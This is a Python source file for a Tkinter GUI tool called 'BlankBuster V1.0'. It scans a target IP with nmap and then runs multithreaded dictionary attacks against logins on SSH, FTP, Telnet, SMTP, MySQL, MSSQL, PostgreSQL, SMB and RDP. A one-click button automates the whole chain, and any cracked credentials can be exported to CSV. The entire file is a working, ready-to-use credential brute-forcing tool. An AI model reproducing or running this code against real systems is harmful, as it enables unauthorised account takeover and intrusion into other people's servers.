import smtplib 
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import queue
import threading
import json
import time
import paramiko
import ftplib
import telnetlib3
import mysql.connector
import pymssql
import psycopg2
from impacket.smbconnection import SMBConnection
import subprocess
import asyncio
import nmap


class ProtocolHandler:
    @staticmethod
    def check(protocol, host, port, user, pwd, timeout=10):
        handlers = {
            "SSH": SSHHandler,
            "FTP": FTPHandler,
            "MySQL": MySQLHandler,
            "Telnet": TelnetHandler,
            "SMTP": SMTPHandler,
            "MSSQL": MSSQLHandler,
            "PostgreSQL": PostgreSQLHandler,
            "SMB": SMBHandler,
            "RDP": RDPHandler
        }
        return handlers[protocol].check(host, port, user, pwd, timeout)


class SSHHandler:
    @staticmethod
    def check(host, port, user, pwd, timeout):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port, user, pwd, timeout=timeout)
            client.close()
            return True, "认证成功"
        except Exception as e:
            return False, str(e)


class FTPHandler:
    @staticmethod
    def check(host, port, user, pwd, timeout):
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login(user, pwd)
            ftp.quit()
            return True, "登录成功"
        except Exception as e:
            return False, str(e)


class MySQLHandler:
    @staticmethod
    def check(host, port, user, pwd, timeout):
        try:
            conn = mysql.connector.connect(
                host=host,
                port=port,
                user=user,
                password=pwd,
                connection_timeout=timeout // 1000
            )
            conn.close()
            return True, "连接成功"
        except Exception as e:
            return False, str(e)


class TelnetHandler:
    @staticmethod
    def check(host, port, user, pwd, timeout):
        async def _telnet_login():
            reader, writer = await telnetlib3.open_connection(
                host, port, timeout=timeout
            )
            await writer.write(f"{user}\n")
            await writer.write(f"{pwd}\n")
            response = await reader.read(1024)
            writer.close()
            return "Login failed" not in response

        try:
            success = asyncio.run(_telnet_login())
            return success, "登录成功" if success else "认证失败"
        except Exception as e:
            return False, str(e)


class SMTPHandler:
    @staticmethod
    def check(host, port, user, pwd, timeout):
        try:
            server = smtplib.SMTP(host, port, timeout=timeout)
            server.starttls()
            server.login(user, pwd)
            server.quit()
            return True, "认证成功"
        except Exception as e:
            return False, str(e)


class MSSQLHandler:
    @staticmethod
    def check(host, port, user, pwd, timeout):
        try:
            conn = pymssql.connect(
                server=host,
                port=port,
                user=user,
                password=pwd,
                login_timeout=timeout
            )
            conn.close()
            return True, "连接成功"
        except Exception as e:
            return False, str(e)


class PostgreSQLHandler:
    @staticmethod
    def check(host, port, user, pwd, timeout):
        try:
            conn = psycopg2.connect(
                host=host,
                port=port,
                user=user,
                password=pwd,
                connect_timeout=timeout
            )
            conn.close()
            return True, "认证成功"
        except Exception as e:
            return False, str(e)


class SMBHandler:
    @staticmethod
    def check(host, port, user, pwd, timeout):
        try:
            conn = SMBConnection(host, host, sess_port=port)
            conn.login(user, pwd)
            return True, "登录成功"
        except Exception as e:
            return False, str(e)


class RDPHandler:
    @staticmethod
    def check(host, port, user, pwd, timeout):
        try:
            cmd = [
                "xfreerdp",
                f"/v:{host}:{port}",
                f"/u:{user}",
                f"/p:{pwd}",
                "/cert:ignore",
                "/sec:nla",
                f"/timeout:{timeout}"
            ]
            result = subprocess.run(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=timeout
            )
            success = result.returncode == 0
            return success, "连接成功" if success else "认证失败"
        except Exception as e:
            return False, str(e)


class BruteForceTool:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("BlankBuster V1.0")
        self.root.geometry("1280x800")

        self._init_variables()
        self._configure_ui()
        self._create_widgets()
        self.load_config()
        self.root.mainloop()

    def _init_variables(self):
        self.running = False
        self.task_queue = queue.Queue()
        self.thread_pool = []
        self.protocols = [
            "SSH", "FTP", "MySQL", "Telnet",
            "SMTP", "MSSQL", "PostgreSQL", "SMB", "RDP"
        ]
        self.default_ports = {
            "SSH": 22, "FTP": 21, "Telnet": 23,
            "MySQL": 3306, "MSSQL": 1433,
            "PostgreSQL": 5432, "SMB": 445, "RDP": 3389
        }

    def _configure_ui(self):
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure(".", font=('Segoe UI', 9))
        self.style.configure("TFrame", background="#f5f5f5")
        self.style.configure("Treeview", rowheight=28, font=('Consolas', 9))
        self.style.map("Treeview",
                       background=[("selected", "#3c8dbc")],
                       foreground=[("selected", "white")]
                       )
        self.style.configure("Success.Treeview", background="#e8f5e9")
        self.style.configure("Error.Treeview", background="#ffebee")
        self.style.configure('Autoscan.TButton',
                             foreground='white',
                             background='#d32f2f',
                             font=('微软雅黑', 10, 'bold'))

    def _create_widgets(self):
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # 全自动扫描面板
        autoscan_frame = ttk.LabelFrame(main_frame, text="全服务一把梭")
        autoscan_frame.pack(fill=tk.X, pady=5)

        ttk.Label(autoscan_frame, text="目标IP:").grid(row=0, column=0, padx=5)
        self.autoscan_entry = ttk.Entry(autoscan_frame, width=25)
        self.autoscan_entry.grid(row=0, column=1, padx=5)

        self.autoscan_btn = ttk.Button(
            autoscan_frame,
            text="🔥 全自动扫描",
            command=self.start_autoscan,
            style='Autoscan.TButton'
        )
        self.autoscan_btn.grid(row=0, column=2, padx=10)

        # 常规扫描配置
        config_frame = ttk.LabelFrame(main_frame, text="手动配置扫描")
        config_frame.pack(fill=tk.X, pady=5)

        ttk.Label(config_frame, text="协议:").grid(row=0, column=0, padx=5)
        self.protocol_cb = ttk.Combobox(config_frame, values=self.protocols, width=8)
        self.protocol_cb.grid(row=0, column=1, padx=5)
        self.protocol_cb.current(0)

        ttk.Label(config_frame, text="目标:").grid(row=0, column=2, padx=5)
        self.target_entry = ttk.Entry(config_frame, width=20)
        self.target_entry.grid(row=0, column=3, padx=5)

        ttk.Label(config_frame, text="端口:").grid(row=0, column=4, padx=5)
        self.port_entry = ttk.Entry(config_frame, width=6)
        self.port_entry.grid(row=0, column=5, padx=5)

        self.start_btn = ttk.Button(config_frame, text="▶ 开始", command=self.toggle_scan)
        self.start_btn.grid(row=0, column=6, padx=10)

        # 字典管理
        dict_frame = ttk.LabelFrame(main_frame, text="字典管理")
        dict_frame.pack(fill=tk.X, pady=5)

        ttk.Label(dict_frame, text="用户字典:").grid(row=0, column=0, padx=5)
        self.user_entry = ttk.Entry(dict_frame, width=35)
        self.user_entry.grid(row=0, column=1, padx=5)
        ttk.Button(dict_frame, text="浏览...", command=lambda: self._load_file(self.user_entry)).grid(row=0, column=2,
                                                                                                      padx=5)

        ttk.Label(dict_frame, text="密码字典:").grid(row=0, column=3, padx=5)
        self.pass_entry = ttk.Entry(dict_frame, width=35)
        self.pass_entry.grid(row=0, column=4, padx=5)
        ttk.Button(dict_frame, text="浏览...", command=lambda: self._load_file(self.pass_entry)).grid(row=0, column=5,
                                                                                                      padx=5)

        # 结果展示
        result_frame = ttk.LabelFrame(main_frame, text="扫描结果")
        result_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        columns = ("协议", "目标", "端口", "用户名", "密码", "状态")
        self.result_tree = ttk.Treeview(result_frame, columns=columns, show="headings", selectmode="extended")
        for col in columns:
            self.result_tree.heading(col, text=col)
            self.result_tree.column(col, width=100 if col == "协议" else 150, anchor=tk.W)

        scrollbar = ttk.Scrollbar(result_frame, orient=tk.VERTICAL, command=self.result_tree.yview)
        self.result_tree.configure(yscroll=scrollbar.set)
        self.result_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # 右键菜单
        self.context_menu = tk.Menu(self.root, tearoff=0)
        self.context_menu.add_command(label="导出选中项", command=self.export_selected)
        self.context_menu.add_command(label="复制结果", command=self.copy_results)
        self.result_tree.bind("<Button-3>", self.show_context_menu)

        # 状态栏
        status_bar = ttk.Frame(self.root)
        status_bar.pack(fill=tk.X, side=tk.BOTTOM)

        self.progress = ttk.Progressbar(status_bar, mode='determinate')
        self.progress.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=2)

        self.status_var = tk.StringVar(value="就绪")
        ttk.Label(status_bar, textvariable=self.status_var).pack(side=tk.RIGHT, padx=5)

        ttk.Button(status_bar, text="清空结果", command=self.clear_results).pack(side=tk.RIGHT, padx=5)
        self.filter_combo = ttk.Combobox(status_bar, values=["全部结果", "成功记录", "失败记录"], width=12,
                                         state="readonly")
        self.filter_combo.pack(side=tk.RIGHT, padx=5)
        self.filter_combo.current(0)
        self.filter_combo.bind("<<ComboboxSelected>>", self.filter_results)

    def start_autoscan(self):
        target = self.autoscan_entry.get()
        if not target:
            messagebox.showerror("错误", "请输入目标IP地址")
            return
        threading.Thread(target=self._autoscan_workflow, args=(target,), daemon=True).start()

    def _autoscan_workflow(self, target):
        self.root.after(0, lambda: self.status_var.set("Nmap扫描中..."))
        open_services = self.nmap_scan(target)
        if not open_services:
            self.root.after(0, lambda: messagebox.showinfo("提示", "未发现可爆破服务"))
            return

        self.root.after(0, lambda: self.status_var.set("开始自动爆破..."))
        for service in open_services:
            protocol = self._service_to_protocol(service['name'])
            if protocol:
                self._queue_auto_task(target, service['port'], protocol)

    def nmap_scan(self, target):
        try:
            nm = nmap.PortScanner()
            nm.scan(target, arguments='-Pn -T4 --open -sV -p 21-23,25,80,110,143,443,445,3306,3389,5432')
            open_services = []
            for proto in nm[target].all_protocols():
                for port in nm[target][proto].keys():
                    service = nm[target][proto][port]
                    if service['state'] == 'open':
                        open_services.append({
                            'port': port,
                            'name': service['name'].lower(),
                            'product': service['product']
                        })
            return open_services
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("扫描失败", str(e)))
            return []

    def _service_to_protocol(self, service_name):
        service_map = {
            'ssh': 'SSH',
            'ftp': 'FTP',
            'telnet': 'Telnet',
            'smtp': 'SMTP',
            'mysql': 'MySQL',
            'ms-sql-s': 'MSSQL',
            'postgresql': 'PostgreSQL',
            'microsoft-ds': 'SMB',
            'ms-wbt-server': 'RDP'
        }
        return service_map.get(service_name, None)

    def _queue_auto_task(self, target, port, protocol):
        self.protocol_cb.set(protocol)
        self.target_entry.delete(0, tk.END)
        self.target_entry.insert(0, target)
        self.port_entry.delete(0, tk.END)
        self.port_entry.insert(0, str(port))
        self.root.after(1000, self.toggle_scan)

    def toggle_scan(self):
        if not self.running:
            if self._validate_input():
                self.running = True
                self.start_btn.config(text="⏹ 停止")
                self._start_scanning()
        else:
            self.running = False
            self.start_btn.config(text="▶ 开始")

    def _start_scanning(self):
        self.task_queue.queue.clear()
        protocol = self.protocol_cb.get()
        target = self.target_entry.get()
        port = int(self.port_entry.get()) if self.port_entry.get() else self.default_ports.get(protocol, 0)

        with open(self.user_entry.get()) as f:
            users = [line.strip() for line in f if line.strip()]
        with open(self.pass_entry.get()) as f:
            passwords = [line.strip() for line in f if line.strip()]

        for user in users:
            for pwd in passwords:
                self.task_queue.put((protocol, target, port, user, pwd))

        for _ in range(15):
            thread = threading.Thread(target=self._worker)
            thread.daemon = True
            thread.start()

    def _worker(self):
        while self.running and not self.task_queue.empty():
            try:
                protocol, target, port, user, pwd = self.task_queue.get_nowait()
                success, msg = ProtocolHandler.check(protocol, target, port, user, pwd, 10)
                self.root.after(0, self._update_ui, protocol, target, port, user, pwd, success, msg)
            except queue.Empty:
                break
            except Exception as e:
                self.root.after(0, self._update_ui, protocol, target, port, user, pwd, False, str(e))

    def _update_ui(self, protocol, target, port, user, pwd, success, msg):
        tags = ("success",) if success else ("error",)
        self.result_tree.insert("", "end",
                                values=(protocol, f"{target}:{port}", user, pwd, msg),
                                tags=tags)

        total = self.result_tree.get_children().__len__()
        success_count = len(self.result_tree.tag_has("success"))
        self.status_var.set(f"成功: {success_count} / 总数: {total}")
        self.progress["value"] = (total / (len(self.result_tree.get_children()) + self.task_queue.qsize())) * 100

    def filter_results(self, event=None):
        filter_type = self.filter_combo.get()
        for item in self.result_tree.get_children():
            tags = self.result_tree.item(item, "tags")
            visible = (
                    (filter_type == "全部结果") or
                    (filter_type == "成功记录" and "success" in tags) or
                    (filter_type == "失败记录" and "error" in tags)
            )
            self.result_tree.item(item, open=visible)

    def clear_results(self):
        self.result_tree.delete(*self.result_tree.get_children())
        self.status_var.set("就绪")
        self.progress["value"] = 0

    def copy_results(self):
        selected = self.result_tree.selection()
        if selected:
            data = "\n".join("\t".join(self.result_tree.item(item, "values")) for item in selected)
            self.root.clipboard_clear()
            self.root.clipboard_append(data)

    def export_selected(self):
        path = filedialog.asksaveasfilename(defaultextension=".csv")
        if path:
            with open(path, "w") as f:
                f.write("协议,目标,用户名,密码,状态\n")
                for item in self.result_tree.selection():
                    values = self.result_tree.item(item, "values")
                    f.write(",".join(values) + "\n")

    def show_context_menu(self, event):
        if self.result_tree.selection():
            self.context_menu.tk_popup(event.x_root, event.y_root)

    def _load_file(self, entry):
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if path:
            entry.delete(0, tk.END)
            entry.insert(0, path)

    def load_config(self):
        try:
            with open("config.json") as f:
                config = json.load(f)
                self.target_entry.insert(0, config.get("target", ""))
                self.port_entry.insert(0, config.get("port", ""))
                self.user_entry.insert(0, config.get("user_dict", ""))
                self.pass_entry.insert(0, config.get("pass_dict", ""))
        except FileNotFoundError:
            pass

    def _validate_input(self):
        if not all([self.target_entry.get(), self.user_entry.get(), self.pass_entry.get()]):
            messagebox.showerror("错误", "请填写所有必填字段")
            return False
        return True


if __name__ == "__main__":
    BruteForceTool()
